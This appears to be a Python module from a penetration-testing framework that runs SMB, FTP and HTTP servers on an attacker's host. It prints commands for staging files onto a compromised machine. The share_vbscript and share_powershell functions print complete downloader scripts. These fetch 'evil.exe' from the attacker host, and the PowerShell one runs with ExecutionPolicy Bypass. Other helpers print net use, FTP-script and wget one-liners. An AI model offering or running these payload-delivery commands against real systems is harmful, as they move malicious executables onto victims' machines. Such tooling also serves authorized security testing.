#from ..imports.impacket import smbserver

import os, signal,traceback
import time

from src.miscellaneous.config import Config,bcolors
from src.menus.commons import State
from src.shares.httpserver import httpServer
from src.shares.ftpserver import ftpServer
from src.shares.smbserver import smbServer

def share_smb(cmd=None):
    if len(cmd) == 2:
        if cmd[1] == "start":
            pid = os.fork()
            if pid:
                State.share_state["smb"]["status"] = True
                State.share_state["smb"]["pid"] = pid
                print("{}SMB Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                try:
                    os.chdir(Config.CONFIG['GENERAL']['PATH']+"/db/shares")
                    smbServer(Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['SMBPORT'],Config.CONFIG['SHARES']['SMBUSER'],Config.CONFIG['SHARES']['SMBPASS'],Config.CONFIG['GENERAL']['PATH']+"/db/shares")
                    return
                except Exception as e:
                    print("{}".format(e))
                    print("{}".format(traceback.print_exc()))
                    print("{}Address already in use!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "stop":
            if State.share_state["smb"]["status"]:
                os.kill(State.share_state["smb"]["pid"], signal.SIGKILL)
                State.share_state["smb"]["status"] = False
                State.share_state["smb"]["pid"] = 0
                print("{}SMB Server Stopped!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                print("{}SMB Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "status":
            if State.share_state["smb"]["status"]:
                print("{}SMB Server Active!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                print("{}SMB Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "cmd":
            print("{}net use Z: \\{}\SHARES /USER:\{} {} /PERSISTENT:YES{}".format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['SMBUSER'],Config.CONFIG['SHARES']['SMBPASS'],bcolors.ENDC))
        else:
            print("{}Usage: smb <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
            return
    else:
        print("{}Usage: ftp <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
        return
    return

def share_ftp(cmd=None):
    if len(cmd) == 2:
        if cmd[1] == "start":
            print("{}Usage: ftp start <windows|linux>{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "stop":
            if State.share_state["ftp"]["status"]:
                os.kill(State.share_state["ftp"]["pid"], signal.SIGKILL)
                State.share_state["ftp"]["status"] = False
                State.share_state["ftp"]["pid"] = 0
                print("{}FTP Server Stopped!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                print("{}FTP Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "status":
            if State.share_state["ftp"]["status"]:
                print("{}FTP Server Active!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                print("{}FTP Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "cmd":
            print("{}echo open {} {} > ftp.txt{}".format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['FTPPORT'],bcolors.ENDC))
            print("{}echo USER {} {} >> ftp.txt{}".format(bcolors.OKBLUE,Config.CONFIG['SHARES']['FTPUSER'],Config.CONFIG['SHARES']['FTPPASS'],bcolors.ENDC))
            print("{}echo bin >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
            print("{}echo GET {{file}} >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
            print("{}echo bye >> ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
            print("{}ftp -v -n -s:ftp.txt{}".format(bcolors.OKBLUE,bcolors.ENDC))
        else:
            print("{}Usage: ftp <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
            return
    elif len(cmd) == 3 and cmd[1] == "start":
        if cmd[2] == "windows" or cmd[2] == "linux":
            pid = os.fork()
            if pid:
                State.share_state["ftp"]["status"] = True
                State.share_state["ftp"]["pid"] = pid
                print("{}FTP Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                try:
                    os.chdir(Config.CONFIG['GENERAL']['PATH']+"/db/shares/"+cmd[2])
                    ftpServer(Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['FTPPORT'],Config.CONFIG['SHARES']['FTPUSER'],Config.CONFIG['SHARES']['FTPPASS'])
                    return
                except Exception as e:
                    print("{}".format(e))
                    print("{}".format(traceback.print_exc()))
                    print("{}Address already in use!{}".format(bcolors.WARNING,bcolors.ENDC))
        else:
            print("{}Usage: ftp start <windows|linux>{}".format(bcolors.WARNING,bcolors.ENDC))

    else:
        print("{}Usage: ftp <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
        return
    return

def share_http(cmd=None):
    if len(cmd) == 2:
        if cmd[1] == "start":
            pid = os.fork()
            if pid:
                State.share_state["http"]["status"] = True
                State.share_state["http"]["pid"] = pid
                print("{}HTTP Server Started!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                try:
                    os.chdir(Config.CONFIG['GENERAL']['PATH']+"/db/shares")
                    httpServer(Config.CONFIG['GENERAL']['HOSTIP'],Config.CONFIG['SHARES']['HTTPPORT'])
                    return
                except Exception as e:
                    print("{}".format(e))
                    print("{}".format(traceback.print_exc()))
                    print("{}Address already in use!{}".format(bcolors.WARNING,bcolors.ENDC))

        elif cmd[1] == "stop":
            if State.share_state["http"]["status"]:
                os.kill(State.share_state["http"]["pid"], signal.SIGINT)
                State.share_state["http"]["status"] = False
                State.share_state["http"]["pid"] = 0
                print("{}HTTP Server Stopped!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                print("{}HTTP Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif cmd[1] == "status":
            if State.share_state["http"]["status"]:
                print("{}HTTP Server Active!{}".format(bcolors.OKGREEN,bcolors.ENDC))
            else:
                print("{}HTTP Server Inactive!{}".format(bcolors.WARNING,bcolors.ENDC))
            
        elif cmd[1] == "cmd":
            print("{}wget http://{}/{{PATH}}{}".format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],bcolors.ENDC))
        else:
            print("{}Usage: http <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
            return
    else:
        print("{}Usage: http <start|stop|status|cmd>{}".format(bcolors.WARNING,bcolors.ENDC))
        return

def share_vbscript(cmd=None):
    print ("""
{}echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://{}/evil.exe evil.exe{}
    """.format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],bcolors.ENDC))
    return
def share_powershell(cmd=None):
    print("""
{}echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://{}/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1{}
    """.format(bcolors.OKBLUE,Config.CONFIG['GENERAL']['HOSTIP'],bcolors.ENDC))
    return

switcher_share = {"smb":share_smb,"ftp":share_ftp,"http":share_http,"powershell":share_powershell,"vbscript":share_vbscript}


def internal_share(cmd=None):

    switcher_share.get(cmd[0],"Invalid!")(cmd)
